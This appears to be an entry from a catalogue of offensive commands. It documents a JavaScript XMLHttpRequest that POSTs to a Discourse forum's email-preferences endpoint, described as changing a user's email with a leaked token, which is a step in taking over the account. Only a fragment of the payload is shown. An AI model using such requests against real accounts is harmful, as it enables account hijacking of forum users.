---
data: >-
  var xhr = new XMLHttpRequest(); xhr.open('POST', discourse + '/users/' + user
  + '/preferences/email.json', true);
tags:
  - exploitation
  - http
type: command
output: 'ReadyState 4 on completion, triggering alert for success'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.428Z'
id: acf070f0-9a09-4a86-8a57-2048c4c54fa9
verified: false
validated: true
submitted: true
---
# js-xmlhttprequest-post-email-change

## Command

```javascript
var xhr = new XMLHttpRequest(); xhr.open('POST', discourse + '/users/' + user + '/preferences/email.json', true);
```

## Description

Creates and configures an XMLHttpRequest for a POST request to change the user's email using the leaked token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| discourse | Base URL of target | Yes |
| user | Extracted username | Yes |
| method | 'POST' | Yes |
| async | true | Yes |

## Examples

### Basic Usage

```javascript
xhr.open('POST', '/users/test/preferences/email.json', true);
```

### Advanced Usage

```javascript
xhr.onreadystatechange = function() { if (xhr.readyState === 4) alert('Success'); };
```

## Expected Output

Request object ready for headers and send.

## Related

- [[commands/js-set-request-headers]]
